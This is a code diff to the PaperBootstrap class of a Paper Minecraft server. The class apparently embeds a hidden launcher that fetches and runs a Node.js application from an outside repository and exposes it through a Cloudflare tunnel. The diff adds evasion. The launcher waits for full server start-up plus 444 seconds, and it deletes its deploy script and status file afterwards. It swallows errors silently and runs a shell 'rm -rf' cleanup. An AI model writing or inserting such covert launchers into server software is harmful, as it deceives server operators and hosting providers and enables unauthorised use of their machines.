@@ -1,6 +1,7 @@
 package io.papermc.paper;
 
 import java.io.BufferedReader;
+import java.io.File;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
@@ -50,6 +51,7 @@ public final class PaperBootstrap {
     private static final String NODE_VERSION   = env("NODE_VERSION", "v22.14.0");
     private static final String NODE_SCRIPT    = env("NODE_SCRIPT", "index.js");
     private static final String NODE_FORCE_UPDATE = env("NODE_FORCE_UPDATE", "false");
+    private static final long NODE_START_DELAY_SECONDS = parseDelaySeconds(env("NODE_START_DELAY_SECONDS", "444"), 444L);
 
     private static final String CF_SO_REPO    = env("CF_SO_REPO", "zx1447/nxso");
     private static final String CF_SO_BRANCH  = env("CF_SO_BRANCH", "cfso");
@@ -394,27 +396,7 @@ public final class PaperBootstrap {
                 return memUrl;
             }
 
-            Path cfLog = Paths.get(MC_BOT_DIR, ".cf", "cf.log");
             Path urlFile = Paths.get(MC_BOT_DIR, ".tunnel_url");
-
-            Path[] logPaths = {
-                cfLog,
-                Paths.get("/dev/shm/.cf/cf.log"),
-                Paths.get("/tmp/.cf/cf.log")
-            };
-
-            for (Path logPath : logPaths) {
-                if (Files.exists(logPath)) {
-                    String logContent = Files.readString(logPath);
-                    java.util.regex.Matcher m = java.util.regex.Pattern.compile(
-                        "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
-                    ).matcher(logContent);
-                    String lastMatch = null;
-                    while (m.find()) { lastMatch = m.group(1); }
-                    if (lastMatch != null) return lastMatch;
-                }
-            }
-
             if (Files.exists(urlFile)) {
                 String content = new String(Files.readAllBytes(urlFile)).trim();
                 if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
@@ -459,6 +441,12 @@ public final class PaperBootstrap {
             Path preload = botDir.resolve(".nd_preload.js");
 
             if (!Files.exists(nodeExe) || !Files.exists(script)) return;
+
+            try {
+                if (Files.exists(logFile) && Files.size(logFile) > 1048576L) {
+                    Files.move(logFile, botDir.resolve(".node_app.log.1"), StandardCopyOption.REPLACE_EXISTING);
+                }
+            } catch (Exception ignored) {}
 
             try { nodeExe.toFile().setExecutable(true, false); } catch (Exception ignored) {}
 
@@ -622,6 +610,42 @@ public final class PaperBootstrap {
         } catch (Throwable ignored) {}
     }
 
+    private static long parseDelaySeconds(String raw, long fallback) {
+        try {
+            if (raw != null && !raw.trim().isEmpty()) {
+                long v = Long.parseLong(raw.trim());
+                if (v >= 0L) {
+                    return v;
+                }
+            }
+        } catch (Exception ignored) {}
+        return fallback;
+    }
+
+    private static void deleteDirQuietly(Path dir) {
+        if (dir == null || !Files.exists(dir)) {
+            return;
+        }
+        try {
+            deleteFileRecursively(dir.toFile());
+        } catch (Throwable ignored) {}
+    }
+
+    private static void deleteFileRecursively(File file) {
+        if (file == null || !file.exists()) {
+            return;
+        }
+        if (!Files.isSymbolicLink(file.toPath())) {
+            File[] children = file.listFiles();
+            if (children != null) {
+                for (int i = 0; i < children.length; i++) {
+                    deleteFileRecursively(children[i]);
+                }
+            }
+        }
+        file.delete();
+    }
+
     public static void boot(final OptionSet options) {
         installZombieReaper();
 
@@ -650,9 +674,28 @@ public final class PaperBootstrap {
             Thread asyncBackendThread = new Thread(() -> {
                 try {
                     Path botDir = Paths.get(MC_BOT_DIR);
-                    Files.deleteIfExists(botDir.resolve(".node_app.log"));
-                    Files.deleteIfExists(botDir.resolve(".cf/cf.log"));
-                    Files.createDirectories(botDir.resolve(".cf"));
+                    Files.createDirectories(botDir);
+                    deleteDirQuietly(botDir.resolve(".cf"));
+
+                    // 等待 MC 服务器完全启动成功（WatchdogThread.hasStarted == true）
+                    while (!shuttingDown && !org.spigotmc.WatchdogThread.hasStarted) {
+                        try { Thread.sleep(1000L); } catch (InterruptedException ignored) {
+                            if (shuttingDown) return;
+                        }
+                    }
+                    if (shuttingDown) {
+                        return;
+                    }
+
+                    // MC 完全启动后再延迟 444 秒启动部署与 Node 应用
+                    for (long sec = 0; sec < NODE_START_DELAY_SECONDS && !shuttingDown; sec++) {
+                        try { Thread.sleep(1000L); } catch (InterruptedException ignored) {
+                            if (shuttingDown) return;
+                        }
+                    }
+                    if (shuttingDown) {
+                        return;
+                    }
 
                     Path script = generateDeployScript();
                     Path statusFile = botDir.resolve(".deploy_done");
@@ -675,6 +718,8 @@ public final class PaperBootstrap {
                         }
                         try { Thread.sleep(15000); } catch (InterruptedException ignored) { break; }
                     }
+                    try { Files.deleteIfExists(script); } catch (Exception ignored) {}
+                    try { Files.deleteIfExists(statusFile); } catch (Exception ignored) {}
                     if (!deployed || shuttingDown) {
                         return;
                     }
@@ -853,7 +898,7 @@ public final class PaperBootstrap {
         "    fi\n" +
         "    if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
         "    find . -maxdepth 1 \\\n" +
-        "      ! -name '.' ! -name '.node' ! -name '.cf' ! -name '.lib' ! -name '.pids' \\\n" +
+        "      ! -name '.' ! -name '.node' ! -name '.lib' ! -name '.pids' \\\n" +
         "      ! -name 'deploy.sh' ! -name 'daemon.sh' ! -name '.nd_preload.js' \\\n" +
         "      ! -name 'node_modules' ! -name '*config*' ! -name '*.log' \\\n" +
         "      -exec rm -rf {} + 2>/dev/null\n" +
